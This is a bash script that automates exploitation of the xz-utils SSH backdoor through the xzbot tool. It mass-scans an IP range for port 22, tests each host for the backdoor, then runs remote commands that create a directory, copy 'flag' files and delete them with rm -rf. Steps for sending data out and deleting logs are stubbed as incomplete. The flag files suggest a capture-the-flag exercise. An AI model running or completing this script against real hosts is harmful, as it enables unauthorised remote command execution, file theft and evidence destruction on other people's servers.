#!/bin/bash

echo "================================"
echo "xzbot exploit automation"
echo "================================"

echo "$(date)"

ip_pattern="^([0-9]{1,3}(\-[0-9]{1,3})?\.){3}[0-9]{1,3}(\-[0-9]{1,3})?$"

# Add multi IP address in the near future...
# Check argument
if [[ ${#} -eq 0 ]]; then
	echo "-------------------------------"
	echo "[-] No IP address given"
	echo "[?] Command format: ${0} {IP_ADDRESS}"
	echo "[?] IP_ADDRESS could be range(ex. 127.0.0-10.1-100)"
	echo "-------------------------------"
	echo "[-] Terminate program"
	exit 1
elif [[ ! ${1} =~ ${ip_pattern} ]]; then
	echo "-------------------------------"
	echo "[-] Invalid IP format"
	echo "[?] Single IP format could be 127.0.0.1"
	echo "[?] Ranged IP format could be 127.0.0-10.1-100"
	echo "-------------------------------"
	echo "[-] Terminate program"
	exit 1
fi

# Nmap Port Scanner -> Custom Port Scanner
echo "--------------------------------"
echo "[+] SSH scanning"
ip_str=$(nmap -Pn -p22 -open ${1} -n -oG - | awk '/Up$/{print $2}')
ip_array=(${ip_str})
echo "[+] SSH scan complete"
echo "[+] IP list"
for index in $(seq 1 ${#ip_array[@]})
do
	echo "${index}. ${ip_array[${index}-1]}"
done

echo "--------------------------------"

root_path="/home/admin"
target_path="${root_path}/exploit"
make_dir="mkdir ${target_path}"
copy_flag="find ${root_path} -name \"*flag*\" -exec cp {} ${target_path} \;"
send_data="" # Incomplete
delete_file="rm -rf ${target_path}"
log_delete="" # Incomplete

for index in $(seq 1 ${#ip_array[@]})
do
	echo "${index}. ${ip_array[${index}-1]}:22"
	xzbot="xzbot -addr ${ip_array[${index}-1]}:22 -cmd"
	
	echo "[+] Health check start"
	xzbot_check="$(${xzbot} "" 2>&1 > /dev/null | wc -c)"
	if [ "${xzbot_check}" == 47 ]; then
		echo "[+] ${ip_array[${index}-1]}:22 is exploitable"
	else
		echo "[-] Health check failed"
		echo "--------------------------------"
		continue
	fi

	# Add all function's success or failure
	
	echo "[+] Make directory"
	${xzbot} "${make_dir}" > /dev/null 2>&1
	
	echo "[+] Copy flag files"
	${xzbot} "${copy_flag}" > /dev/null 2>&1
	
	# echo "[+] Sending data"
	# ${xzbot} "${send_data}" > /dev/null 2>&1
	
	echo "[+] Delete files"
	${xzbot} "${delete_file}" > /dev/null 2>&1
	
	# echo "[+] Delete logs"
	# ${xzbot} "$delete_log}" > /dev/null 2>&1

	echo "[+] Tasks done"
	echo "--------------------------------"
done

echo "[+] Tasks finished"